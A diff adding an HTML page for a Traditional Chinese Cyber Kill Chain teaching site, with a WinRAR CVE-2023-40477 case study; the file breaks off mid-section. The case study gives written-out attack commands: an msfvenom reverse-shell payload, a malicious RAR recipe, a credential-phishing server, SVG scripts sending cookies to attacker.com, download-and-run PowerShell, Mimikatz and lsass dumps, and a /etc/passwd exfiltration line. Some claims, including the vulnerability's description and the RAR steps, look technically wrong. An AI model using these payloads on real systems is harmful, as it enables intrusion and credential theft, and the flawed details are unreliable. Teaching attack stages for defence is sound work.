@@ -1,0 +1,1175 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>網路攻擊鏈教學網站 - Cyber Kill Chain (CKC)</title>
+    <link rel="stylesheet" href="./style.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <!-- 導航欄 -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <h1 class="nav-title">網路攻擊鏈教學 (CKC)</h1>
+            <div class="nav-menu">
+                <a href="#home" class="nav-link">首頁</a>
+                <a href="#stages" class="nav-link">攻擊階段</a>
+                <a href="#conditions" class="nav-link">核心條件</a>
+                <a href="#case-study" class="nav-link">案例研究</a>
+                <a href="#defense" class="nav-link">防禦工具</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- 首頁區塊 -->
+    <section id="home" class="hero">
+        <div class="hero-content">
+            <h1>網路攻擊鏈 (Cyber Kill Chain)</h1>
+            <p class="hero-subtitle">由 Lockheed Martin Inc. 於 2011 年提出的 APT 攻擊模型</p>
+            <div class="hero-description">
+                <p>網路攻擊鏈是基於眾多進階持續性威脅 (Advanced Persistent Threat, APT) 的真實案例歸納出的模型。</p>
+                <p>APT 是一種針對特定目標、經過精心策畫、具有商業或政治動機的攻擊，通常針對特定組織或國家，並長時間保持高隱蔽性。</p>
+                <div class="vulnerability-stats">
+                    <h3>📊 企業漏洞利用統計</h3>
+                    <div class="stats-grid">
+                        <div class="stat-item">
+                            <span class="stat-number">5-6%</span>
+                            <span class="stat-label">歷年通報漏洞中實際被利用的比例 (EPSS研究)</span>
+                        </div>
+                        <div class="stat-item">
+                            <span class="stat-number">~1%</span>
+                            <span class="stat-label">2024年新發佈CVE中被觀察到利用的比例</span>
+                        </div>
+                    </div>
+                    <p class="stats-note">攻擊者精挑同時具備「有弱點」、「可利用」且「無防護」的目標進行攻擊</p>
+                </div>
+            </div>
+            <button class="cta-button" onclick="scrollToSection('stages')">開始學習</button>
+        </div>
+    </section>
+
+    <!-- 核心條件區塊 -->
+    <section id="conditions" class="conditions-section">
+        <div class="container">
+            <h2 class="section-title">攻擊成功的三個核心條件</h2>
+            <div class="conditions-grid">
+                <div class="condition-card vulnerable">
+                    <div class="condition-icon">
+                        <i class="fas fa-bug"></i>
+                    </div>
+                    <h3>有弱點 (Vulnerable)</h3>
+                    <p>目標系統存在未修補或配置不當的安全漏洞</p>
+                    <ul>
+                        <li>未修補的系統漏洞</li>
+                        <li>配置錯誤的服務</li>
+                        <li>弱密碼或預設帳號</li>
+                        <li>過時的軟體版本</li>
+                    </ul>
+                </div>
+                <div class="condition-card exploitable">
+                    <div class="condition-icon">
+                        <i class="fas fa-tools"></i>
+                    </div>
+                    <h3>可利用 (Exploitable)</h3>
+                    <p>存在可以實際操作的攻擊手法和工具</p>
+                    <ul>
+                        <li>已知的 Exploit 程式碼</li>
+                        <li>可用的攻擊工具</li>
+                        <li>成功的攻擊技術</li>
+                        <li>實際的利用路徑</li>
+                    </ul>
+                </div>
+                <div class="condition-card unprotected">
+                    <div class="condition-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <h3>無防護 (No Protection)</h3>
+                    <p>目標系統缺乏足夠的資安防禦措施</p>
+                    <ul>
+                        <li>缺少修補程式</li>
+                        <li>未啟用的防火牆</li>
+                        <li>無效的防毒軟體</li>
+                        <li>未設置入侵防禦系統</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 攻擊階段區塊 -->
+    <section id="stages" class="stages-section">
+        <div class="container">
+            <h2 class="section-title">網路攻擊鏈七大階段</h2>
+            
+            <!-- 視覺化攻擊鏈流程圖 -->
+            <div class="kill-chain-visualization">
+                <div class="chain-header">
+                    <h3>🔗 Cyber Kill Chain 攻擊流程視覺化</h3>
+                    <p>每個環節都是攻擊者突破防禦並達成目標的關鍵步驟</p>
+                </div>
+                
+                <!-- 英文版攻擊鏈圖 -->
+                <div class="visual-diagram-container">
+                    <div class="diagram-section">
+                        <h4>📊 國際標準 Cyber Kill Chain 流程圖</h4>
+                        <img src="cyber-kill-chain.png" alt="Cyber Kill Chain - English Version" class="kill-chain-diagram">
+                        <p class="diagram-caption">洛克希德馬丁公司標準Cyber Kill Chain七階段攻擊流程</p>
+                    </div>
+                    
+                    <!-- 中文版攻擊鏈圖 -->
+                    <div class="diagram-section">
+                        <h4>🔗 中文化網路殺傷鏈流程圖</h4>
+                        <img src="cyber-kill-chain-chinese.png" alt="網路殺傷鏈 - 中文版" class="kill-chain-diagram">
+                        <p class="diagram-caption">中文化的網路殺傷鏈攻擊步驟與技術說明</p>
+                    </div>
+                    
+                </div>
+            </div>
+
+            <!-- 攻擊鏈七大階段分頁區塊（互動） -->
+            <div class="stages-tabs">
+                <!-- 階段導航 -->
+                <div class="stage-navigation">
+                    <button class="stage-nav-btn active" data-stage="1">1. 偵蒐</button>
+                    <button class="stage-nav-btn" data-stage="2">2. 武器化</button>
+                    <button class="stage-nav-btn" data-stage="3">3. 交付</button>
+                    <button class="stage-nav-btn" data-stage="4">4. 利用</button>
+                    <button class="stage-nav-btn" data-stage="5">5. 安裝</button>
+                    <button class="stage-nav-btn" data-stage="6">6. 控制</button>
+                    <button class="stage-nav-btn" data-stage="7">7. 行動</button>
+                </div>
+
+                <!-- 階段內容 -->
+                <div class="stages-content">
+                    <!-- 第1階段 -->
+                    <div class="stage-card active" id="stage-1">
+                        <div class="stage-header">
+                            <div class="stage-number">01</div>
+                            <div class="stage-info">
+                                <h3>目標情資偵蒐 (Reconnaissance)</h3>
+                                <p class="stage-purpose">收集目標相關資訊</p>
+                            </div>
+                        </div>
+                        <div class="stage-content">
+                            <div class="tools-section">
+                                <h4><i class="fas fa-search"></i> 相關操作與工具</h4>
+                                <div class="tools-grid">
+                                    <div class="tool-item">
+                                        <code>netstat -an</code>
+                                        <span>檢查網路接口</span>
+                                    </div>
+                                    <div class="tool-item">
+                                        <code>nslookup</code>
+                                        <span>查詢 DNS 資訊</span>
+                                    </div>
+                                    <div class="tool-item">
+                                        <code>net view \\ip</code>
+                                        <span>查看對方局域網共享</span>
+                                    </div>
+                                    <div class="tool-item">
+                                        <code>ipconfig /all</code>
+                                        <span>顯示全部 IP 配置資訊</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 第2階段 -->
+                    <div class="stage-card" id="stage-2">
+                        <div class="stage-header">
+                            <div class="stage-number">02</div>
+                            <div class="stage-info">
+                                <h3>準備武器 (Weaponization)</h3>
+                                <p class="stage-purpose">準備弱點利用程式和惡意程式</p>
+                            </div>
+                        </div>
+                        <div class="stage-content">
+                            <div class="tools-section">
+                                <h4><i class="fas fa-hammer"></i> 相關操作與工具</h4>
+                                <div class="primary-tool">
+                                    <h5>Metasploit Framework (MSF)</h5>
+                                    <p>重要的資安弱點檢測工具</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 第3階段 -->
+                    <div class="stage-card" id="stage-3">
+                        <div class="stage-header">
+                            <div class="stage-number">03</div>
+                            <div class="stage-info">
+                                <h3>散播/遞送/交付武器至目標端 (Delivery)</h3>
+                                <p class="stage-purpose">將惡意程式傳送給目標</p>
+                            </div>
+                        </div>
+                        <div class="stage-content">
+                            <div class="tools-section">
+                                <h4><i class="fas fa-paper-plane"></i> 相關操作與工具</h4>
+                                <div class="tools-grid">
+                                    <div class="tool-item">
+                                        <code>ftp / tftp</code>
+                                        <span>文件傳輸協議</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 第4階段 -->
+                    <div class="stage-card" id="stage-4">
+                        <div class="stage-header">
+                            <div class="stage-number">04</div>
+                            <div class="stage-info">
+                                <h3>受害端被誘使觸發惡意代碼取得立足點 (Exploitation)</h3>
+                                <p class="stage-purpose">利用漏洞讓受害端執行惡意程式</p>
+                            </div>
+                        </div>
+                        <div class="stage-content">
+                            <div class="core-conditions">
+                                <h4><i class="fas fa-exclamation-triangle"></i> 三個核心條件在此階段的應用</h4>
+                                <div class="conditions-in-stage">
+                                    <div class="condition-detail vulnerable">
+                                        <h5>有弱點 (Vulnerable)</h5>
+                                        <p>目標系統存在未修補或配置不當的安全漏洞</p>
+                                    </div>
+                                    <div class="condition-detail exploitable">
+                                        <h5>可利用 (Exploitable)</h5>
+                                        <p>存在可以實際操作的攻擊手法和工具</p>
+                                    </div>
+                                    <div class="condition-detail unprotected">
+                                        <h5>無防護 (No Protection)</h5>
+                                        <p>目標系統缺乏足夠的資安防禦措施</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 第5階段 -->
+                    <div class="stage-card" id="stage-5">
+                        <div class="stage-header">
+                            <div class="stage-number">05</div>
+                            <div class="stage-info">
+                                <h3>安裝惡意程式 (Installation)</h3>
+                                <p class="stage-purpose">在受害端安裝惡意程式，確保持久性</p>
+                            </div>
+                        </div>
+                        <div class="stage-content">
+                            <div class="tools-section">
+                                <h4><i class="fas fa-download"></i> 建立持久性的相關操作與工具</h4>
+                                <div class="tools-grid">
+                                    <div class="tool-item">
+                                        <code>net user</code>
+                                        <span>建立用戶</span>
+                                    </div>
+                                    <div class="tool-item">
+                                        <code>schtasks</code>
+                                        <span>建立排程任務</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 第6階段 -->
+                    <div class="stage-card" id="stage-6">
+                        <div class="stage-header">
+                            <div class="stage-number">06</div>
+                            <div class="stage-info">
+                                <h3>命令與控制受害端 (Command & Control)</h3>
+                                <p class="stage-purpose">建立與受害端的控制通道</p>
+                            </div>
+                        </div>
+                        <div class="stage-content">
+                            <div class="tools-section">
+                                <h4><i class="fas fa-network-wired"></i> 相關操作與工具</h4>
+                                <div class="primary-tool">
+                                    <h5>Meterpreter Session</h5>
+                                    <p>Metasploit 成功利用後建立的會話</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 第7階段 -->
+                    <div class="stage-card" id="stage-7">
+                        <div class="stage-header">
+                            <div class="stage-number">07</div>
+                            <div class="stage-info">
+                                <h3>進行目標目的之相關操作 (Actions on Objectives)</h3>
+                                <p class="stage-purpose">達成攻擊者的最終目的</p>
+                            </div>
+                        </div>
+                        <div class="stage-content">
+                            <div class="tools-section">
+                                <h4><i class="fas fa-crosshairs"></i> 相關操作與工具</h4>
+                                <div class="tools-grid">
+                                    <div class="tool-item">
+                                        <code>rar.exe</code>
+                                        <span>壓縮工具進行數據外滲</span>
+                                    </div>
+                                    <div class="tool-item">
+                                        <code>tasklist</code>
+                                        <span>列出進程</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div> <!-- stages-content 結束 -->
+            </div> <!-- stages-tabs 結束 -->
+        </div>
+    </section>
+
+    <!-- 案例研究區塊 -->
+    <section id="case-study" class="case-study-section">
+        <div class="container">
+            <h2 class="section-title">實際案例研究：WinRAR CVE-2023-40477</h2>
+            
+            <!-- Windows 10 支援終止警告 -->
+            <div class="warning-banner">
+                <div class="warning-content">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <div class="warning-text">
+                        <h3>⚠️ Windows 10 支援即將終止</h3>
+                        <p><strong>2025年10月14日</strong> Windows 10 將停止支援，企業面臨雙重資安風險</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 漏洞概述 -->
+            <div class="vulnerability-overview">
+                <h3><i class="fas fa-bug"></i> CVE-2023-40477 漏洞概述</h3>
+                <div class="vuln-details">
+                    <div class="vuln-info">
+                        <h4>漏洞描述</h4>
+                        <p>WinRAR存在安全漏洞，起因於處理壓縮檔案時的路徑遍歷問題</p>
+                    </div>
+                    <div class="vuln-impact">
+                        <h4>影響範圍</h4>
+                        <p><strong>影響平台：</strong>WinRAR 6.23(不含)以下版本</p>
+                        <p><strong>風險等級：</strong>高危</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 企業環境影響圖 -->
+            <div class="environment-diagram">
+                <h3><i class="fas fa-network-wired"></i> 企業內部環境影響分析</h3>
+                <div class="network-topology">
+                    <div class="network-segment dmz">
+                        <h4>DMZ區域</h4>
+                        <div class="network-devices">
+                            <div class="device web-server">
+                                <i class="fas fa-server"></i>
+                                <span>Web伺服器</span>
+                            </div>
+                            <div class="device mail-server">
+                                <i class="fas fa-envelope"></i>
+                                <span>郵件伺服器</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="network-segment internal">
+                        <h4>內部網路</h4>
+                        <div class="network-devices">
+                            <div class="device workstation vulnerable">
+                                <i class="fas fa-desktop"></i>
+                                <span>工作站 (WinRAR 6.22)</span>
+                                <div class="vuln-indicator">易受攻擊</div>
+                            </div>
+                            <div class="device file-server">
+                                <i class="fas fa-hdd"></i>
+                                <span>檔案伺服器</span>
+                            </div>
+                            <div class="device domain-controller">
+                                <i class="fas fa-shield-alt"></i>
+                                <span>網域控制器</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="attack-flow">
+                    <h4>攻擊路徑示意</h4>
+                    <div class="flow-steps">
+                        <div class="flow-step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">
+                                <strong>釣魚郵件</strong>
+                                <p>攻擊者發送含惡意RAR檔案的郵件</p>
+                            </div>
+                        </div>
+                        <div class="flow-arrow">→</div>
+                        <div class="flow-step">
+                            <div class="step-number">2</div>
+                            <div class="step-content">
+                                <strong>漏洞觸發</strong>
+                                <p>使用者開啟RAR檔案觸發CVE-2023-40477</p>
+                            </div>
+                        </div>
+                        <div class="flow-arrow">→</div>
+                        <div class="flow-step">
+                            <div class="step-number">3</div>
+                            <div class="step-content">
+                                <strong>橫向移動</strong>
+                                <p>攻擊者利用內網憑證擴散至其他系統</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 駭客利用方式 -->
+            <div class="hacker-exploitation">
+                <h3><i class="fas fa-user-ninja"></i> 駭客利用方式詳解</h3>
+                
+                <div class="exploitation-steps">
+                    <div class="exploit-step">
+                        <h4>第一階段：初始入侵</h4>
+                        <div class="step-details">
+                            <div class="technique">
+                                <h5>1. 情資蒐集階段</h5>
+                                <div class="intel-sources">
+                                    <h6>🔍 漏洞情資來源</h6>
+                                    <div class="source-grid">
+                                        <div class="source-item">
+                                            <strong>ExploitDB</strong>
+                                            <div class="code-block">
+                                                <code>
+# 搜尋WinRAR相關漏洞<br>
+searchsploit winrar<br>
+searchsploit -m 51447  # 下載CVE-2023-40477 exploit
+                                                </code>
+                                            </div>
+                                        </div>
+                                        <div class="source-item">
+                                            <strong>GitHub</strong>
+                                            <div class="code-block">
+                                                <code>
+# GitHub搜尋相關POC<br>
+git clone https://github.com/b1tg/CVE-2023-40477<br>
+git clone https://github.com/maldev866/WinRAR_CVE-2023-40477
+                                                </code>
+                                            </div>
+                                        </div>
+                                        <div class="source-item">
+                                            <strong>其他情資來源</strong>
+                                            <ul>
+                                                <li><a href="https://www.rapid7.com/db/modules/" target="_blank" rel="noopener">Metasploit Framework modules</a></li>
+                                                <li><a href="https://packetstormsecurity.com/" target="_blank" rel="noopener">PacketStorm Security</a></li>
+                                                <li><a href="https://0day.today/" target="_blank" rel="noopener">0day.today</a></li>
+                                                <li><a href="https://vulners.com/" target="_blank" rel="noopener">Vulners.com</a></li>
+                                                <li><a href="https://www.cvedetails.com/" target="_blank" rel="noopener">CVE Details</a></li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <h6>🌐 目標探測 - 第三方情資平台</h6>
+                                <div class="recon-platforms">
+                                    <div class="platform-item">
+                                        <strong><a href="https://www.shodan.io/" target="_blank" rel="noopener">Shodan</a></strong>
+                                        <div class="code-block">
+                                            <code>
+# Shodan搜尋查詢語句<br>
+port:21 "FileZilla"  # 尋找FTP服務<br>
+port:80,443 "IIS" country:"TW"  # 尋找台灣的IIS服務器<br>
+org:"target-company" port:22  # 特定組織的SSH服務<br>
+product:"WinRAR" version:"6.22"  # 直接搜尋脆弱版本
+                                            </code>
+                                        </div>
+                                    </div>
+                                    <div class="platform-item">
+                                        <strong><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">ZoomEye</a></strong>
+                                        <div class="code-block">
+                                            <code>
+# ZoomEye搜尋語句<br>
+app:"FileZilla" country:"TW"<br>
+port:3389 city:"Taipei"  # RDP服務<br>
+service:"ssh" port:22 +country:"TW"
+                                            </code>
+                                        </div>
+                                    </div>
+                                    <div class="platform-item">
+                                        <strong>其他探測平台</strong>
+                                        <ul>
+                                            <li><a href="https://fofa.info/" target="_blank" rel="noopener">Fofa</a>：protocol="ftp" && country="TW"</li>
+                                            <li><a href="https://search.censys.io/" target="_blank" rel="noopener">Censys</a>：services.port:21 and location.country_code:TW</li>
+                                            <li><a href="https://www.binaryedge.io/" target="_blank" rel="noopener">BinaryEdge</a>：web.body.content:"FileZilla"</li>
+                                            <li><a href="https://www.greynoise.io/" target="_blank" rel="noopener">GreyNoise</a>：classification:malicious</li>
+                                        </ul>
+                                    </div>
+                                </div>
+
+                                <h5>2. 惡意RAR檔案製作 (CVE-2023-40477復現)</h5>
+                                <div class="code-block">
+                                    <code>
+# 創建包含路徑遍歷漏洞的惡意RAR檔案<br>
+# 步驟1: 準備惡意載荷<br>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=攻擊者IP LPORT=4444 -f exe -o payload.exe<br><br>
+
+# 步驟2: 創建目錄結構進行路徑遍歷<br>
+mkdir exploit_dir<br>
+cd exploit_dir<br>
+mkdir -p "..\..\..\..\Users\Public"<br><br>
+
+# 步驟3: 將惡意程式放置到指定路徑<br>
+copy payload.exe "..\..\..\..\Users\Public\update.exe"<br><br>
+
+# 步驟4: 創建惡意RAR檔案<br>
+rar a -ep1 malicious_document.rar "..\..\..\..\Users\Public\update.exe"<br><br>
+
+# 步驟5: 創建自解壓檔案（更隱蔽）<br>
+rar s -sfx malicious_document.rar
+                                    </code>
+                                </div>
+                                
+                                <div class="exploit-details">
+                                    <h6>漏洞原理詳解</h6>
+                                    <p>CVE-2023-40477是一個路徑遍歷漏洞，允許攻擊者在解壓縮時將檔案寫入任意位置：</p>
+                                    <ul>
+                                        <li>利用 <code>../</code> 序列繞過路徑限制</li>
+                                        <li>將惡意檔案寫入系統敏感目錄</li>
+                                        <li>配合自解壓功能實現自動執行</li>
+                                        <li>影響WinRAR 6.23以下所有版本</li>
+                                    </ul>
+                                </div>
+                            </div>
+                            
+                            <div class="technique">
+                                <h5>2. 社交工程攻擊手法詳解</h5>
+                                
+                                <div class="social-engineering-methods">
+                                    <h6>🎭 傳統社交工程手法</h6>
+                                    <ul>
+                                        <li>偽裝成合法文件（如：會議資料.rar、薪資表.rar）</li>
+                                        <li>透過郵件或即時通訊軟體傳送</li>
+                                        <li>利用使用者信任心理誘使開啟</li>
+                                    </ul>
+                                </div>
+
+                                <div class="credential-harvesting">
+                                    <h6>🔑 帳號密碼竊取技術</h6>
+                                    <div class="harvesting-method">
+                                        <h7><strong>Excel釣魚表單攻擊</strong></h7>
+                                        <p>攻擊者製作偽造的Excel登入表單，竊取使用者帳號密碼</p>
+                                        
+                                        <div class="code-block">
+                                            <code>
+# 釣魚伺服器部署 (基於Node.js)<br>
+# 建立Express API接收帳密資料<br>
+npm init -y<br>
+npm install express body-parser<br><br>
+
+# 建立釣魚API server.js<br>
+const express = require('express');<br>
+const bodyParser = require('body-parser');<br>
+const app = express();<br><br>
+
+app.use(bodyParser.json());<br>
+app.post('/xls/', (req, res) => {<br>
+&nbsp;&nbsp;const { email, password } = req.body;<br>
+&nbsp;&nbsp;// 記錄竊取的帳密<br>
+&nbsp;&nbsp;console.log(`Stolen credentials: ${email}:${password}`);<br>
+&nbsp;&nbsp;res.json({ status: 'success' });<br>
+});<br><br>
+
+# GCP Cloud Run 部署<br>
+docker build -t gcr.io/[PROJECT_ID]/fishing_comption .<br>
+gcloud run deploy fishing-comption --image gcr.io/[PROJECT_ID]/fishing_comption
+                                            </code>
+                                        </div>
+                                    </div>
+
+                                    <div class="harvesting-method">
+                                        <h7><strong>假冒登入頁面</strong></h7>
+                                        <div class="technique-list">
+                                            <div class="technique-item">
+                                                <strong>Office 365偽造登入：</strong>複製真實登入頁面，竊取企業帳號
+                                            </div>
+                                            <div class="technique-item">
+                                                <strong>銀行網站釣魚：</strong>偽造銀行登入介面竊取金融帳號
+                                            </div>
+                                            <div class="technique-item">
+                                                <strong>社交媒體釣魚：</strong>偽造Facebook、Gmail等常用服務
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="svg-vulnerabilities">
+                                    <h6>🖼️ 近期SVG漏洞攻擊</h6>
+                                    <p>SVG (Scalable Vector Graphics) 檔案成為新的攻擊向量，攻擊者利用SVG內嵌JavaScript進行攻擊</p>
+                                    
+                                    <div class="svg-attack-types">
+                                        <div class="attack-type">
+                                            <h7><strong>SVG + JavaScript 注入</strong></h7>
+                                            <div class="code-block">
+                                                <code>
+&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')"&gt;<br>
+&nbsp;&nbsp;&lt;circle cx="50" cy="50" r="40" fill="red"/&gt;<br>
+&lt;/svg&gt;<br><br>
+
+&lt;!-- 更隱蔽的SVG載荷 --&gt;<br>
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;<br>
+&nbsp;&nbsp;&lt;script&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;// 執行惡意JavaScript<br>
+&nbsp;&nbsp;&nbsp;&nbsp;fetch('http://attacker.com/steal', {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;method: 'POST',<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;body: document.cookie<br>
+&nbsp;&nbsp;&nbsp;&nbsp;});<br>
+&nbsp;&nbsp;&lt;/script&gt;<br>
+&lt;/svg&gt;
+                                                </code>
+                                            </div>
+                                        </div>
+
+                                        <div class="attack-type">
+                                            <h7><strong>SVG文件上傳攻擊</strong></h7>
+                                            <ul>
+                                                <li><strong>繞過檔案過濾：</strong>SVG被視為圖片檔案，容易繞過安全檢查</li>
+                                                <li><strong>XSS攻擊載體：</strong>在網頁中顯示SVG時觸發JavaScript</li>
+                                                <li><strong>SSRF攻擊：</strong>利用SVG中的外部資源引用</li>
+                                                <li><strong>XXE注入：</strong>在SVG中嵌入XML外部實體攻擊</li>
+                                            </ul>
+                                        </div>
+
+                                        <div class="attack-type">
+                                            <h7><strong>SVG + 社交工程結合</strong></h7>
+                                            <div class="code-block">
+                                                <code>
+# 建立偽造的SVG圖表檔案<br>
+# 偽裝成企業Logo或圖表<br>
+cat &gt; company_logo.svg &lt;&lt; EOF<br>
+&lt;svg xmlns="http://www.w3.org/2000/svg" onload="steal_credentials()"&gt;<br>
+&nbsp;&nbsp;&lt;!-- 正常的Logo圖形 --&gt;<br>
+&nbsp;&nbsp;&lt;rect width="100" height="100" fill="blue"/&gt;<br>
+&nbsp;&nbsp;&lt;script&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;function steal_credentials() {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// 竊取瀏覽器中的敏感資料<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var data = {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cookies: document.cookie,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url: window.location.href,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;userAgent: navigator.userAgent<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;};<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fetch('https://attacker.com/collect', {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;method: 'POST',<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;body: JSON.stringify(data)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;});<br>
+&nbsp;&nbsp;&nbsp;&nbsp;}<br>
+&nbsp;&nbsp;&lt;/script&gt;<br>
+&lt;/svg&gt;<br>
+EOF
+                                                </code>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="advanced-social-engineering">
+                                    <h6>🎯 進階社交工程技術</h6>
+                                    <div class="advanced-techniques">
+                                        <div class="technique-category">
+                                            <h7><strong>心理操控技術</strong></h7>
+                                            <ul>
+                                                <li><strong>權威效應：</strong>偽裝成IT部門、主管發送指令</li>
+                                                <li><strong>緊急性製造：</strong>聲稱帳號即將被鎖定需立即處理</li>
+                                                <li><strong>好奇心驱使：</strong>「機密文件」、「薪資調整通知」</li>
+                                                <li><strong>從眾心理：</strong>「其他同事都已完成驗證」</li>
+                                            </ul>
+                                        </div>
+
+                                        <div class="technique-category">
+                                            <h7><strong>多管道攻擊</strong></h7>
+                                            <ul>
+                                                <li><strong>電子郵件 + 電話：</strong>先發郵件再致電確認增加可信度</li>
+                                                <li><strong>社群媒體偵察：</strong>從LinkedIn、Facebook收集個人資訊</li>
+                                                <li><strong>物理接觸：</strong>USB投放、假冒快遞員</li>
+                                                <li><strong>供應商冒用：</strong>偽裝成合作廠商或客戶</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="exploit-step">
+                        <h4>第二階段：系統滲透</h4>
+                        <div class="step-details">
+                            <div class="technique">
+                                <h5>3. 初始存取後的系統探查</h5>
+                                <div class="code-block">
+                                    <code>
+# 系統基本資訊收集<br>
+systeminfo                              # 獲取系統詳細資訊<br>
+whoami /all                             # 檢查用戶權限和群組<br>
+whoami /priv                            # 檢查用戶特權<br>
+net user                                # 列出所有用戶<br>
+net localgroup administrators          # 檢查管理員群組成員<br>
+net accounts                            # 檢查密碼策略<br><br>
+
+# 網路環境探查<br>
+ipconfig /all                           # 檢查網路配置<br>
+netstat -ano                            # 檢查網路連線<br>
+arp -a                                  # 檢查ARP表<br>
+route print                             # 檢查路由表<br>
+net view                                # 查看網路共享<br>
+nltest /domain_trusts                   # 檢查網域信任關係<br><br>
+
+# 程序和服務探查<br>
+tasklist /svc                           # 列出所有程序和服務<br>
+wmic process list full                  # 詳細程序資訊<br>
+sc query                                # 列出所有服務<br>
+netsh firewall show config             # 檢查防火牆配置
+                                    </code>
+                                </div>
+                            </div>
+                            
+                            <div class="technique">
+                                <h5>4. 權限提升技術</h5>
+                                <div class="code-block">
+                                    <code>
+# UAC繞過技術<br>
+# 方法1: 使用COM對象繞過<br>
+powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/uac-bypass.ps1')"<br><br>
+
+# 方法2: 利用系統程式<br>
+copy payload.exe C:\Windows\System32\<br>
+reg add HKCU\Software\Classes\mscfile\shell\open\command /d "C:\Windows\System32\payload.exe" /f<br>
+eventvwr.msc    # 觸發UAC繞過<br><br>
+
+# 本地權限提升 (如果存在相關漏洞)<br>
+# 檢查可利用的權限提升漏洞<br>
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"<br>
+wmic qfe list    # 檢查已安裝的補丁<br><br>
+
+# 使用PowerUp.ps1進行權限提升檢查<br>
+powershell -ep bypass<br>
+Import-Module .\PowerUp.ps1<br>
+Invoke-AllChecks    # 檢查所有權限提升向量
+                                    </code>
+                                </div>
+                            </div>
+                            
+                            <div class="technique">
+                                <h5>5. 憑證竊取與記憶體轉儲</h5>
+                                <div class="code-block">
+                                    <code>
+# 使用Mimikatz進行憑證竊取<br>
+# 下載Mimikatz<br>
+powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')"<br><br>
+
+# 本地執行Mimikatz<br>
+mimikatz.exe<br>
+privilege::debug                        # 獲取調試權限<br>
+sekurlsa::logonpasswords               # 提取登入憑證<br>
+sekurlsa::wdigest                      # 提取WDigest憑證<br>
+sekurlsa::kerberos                     # 提取Kerberos票據<br>
+sekurlsa::tspkg                        # 提取TSPKG憑證<br>
+lsadump::sam                           # 轉儲SAM資料庫<br>
+lsadump::secrets                       # 提取LSA密鑰<br><br>
+
+# 使用PowerShell版本（更隱蔽）<br>
+Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'<br><br>
+
+# 使用其他工具進行憑證竊取<br>
+# LaZagne - 密碼恢復工具<br>
+lazagne.exe all                        # 提取所有已保存的密碼<br><br>
+
+# 使用Procdump + Mimikatz (Living off the land)<br>
+procdump.exe -accepteula -ma lsass.exe lsass.dmp<br>
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
+                                    </code>
+                                </div>
+                            </div>
+                            <div class="method">
+                                <h5><i class="fas fa-exchange-alt"></i> 跨平台檔案上傳與下載技巧</h5>
+                                <div class="code-block">
+<code>
+# Ubuntu/Linux 系統
+# 傳送端 (將檔案內容 base64 編碼後傳送)
+註解: 將 /etc/passwd 內容 base64 編碼後傳送到 127.0.0.1:4444
+whois -h 127.0.0.1 -p 4444 cat /etc/passwd | base64
+
+# 接收端 (監聽並解碼還原檔案)
+註解: 監聽 4444 埠，接收資料並 base64 解碼
+nc -l -v -p 4444 | sed "s/ //g" | base64 -d
+
+# 其他常見 Linux 傳輸方式
+註解: SSH 授權金鑰方式
